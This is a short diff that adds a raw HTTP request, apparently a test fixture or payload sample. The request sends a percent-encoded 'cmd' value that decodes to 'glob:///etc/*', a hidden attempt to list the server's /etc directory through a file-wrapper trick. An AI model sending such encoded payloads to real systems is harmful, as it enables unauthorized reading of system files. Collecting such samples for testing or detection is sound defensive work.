@@ -1,0 +1,4 @@
+GET /a?cmd=%67%6C%6F%62%3A%2F%2F%2F%65%74%63%2F%2A HTTP/1.1
+Host: demo.example.com
+Connection: close
+
